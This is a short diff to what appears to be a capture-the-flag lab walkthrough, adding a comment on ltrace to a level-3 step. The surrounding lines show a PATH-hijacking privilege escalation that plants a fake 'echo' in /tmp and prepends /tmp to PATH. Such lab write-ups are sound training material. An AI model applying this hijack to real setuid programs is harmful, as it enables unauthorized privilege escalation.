@@ -26,7 +26,7 @@ tcpdump -n -r level02.pcap -Xq
 
 ## 3.
 ll # level03 can execute other commands with high privelage
-ltrace ./level03
+ltrace ./level03 # display dynamic library  (.so or .a) calls
 env # the list of environmental variables
 echo getflag > /tmp/echo && chmod +x /tmp/echo # aliasing getflag
 export PATH=/tmp:$PATH # start from the directory with alias
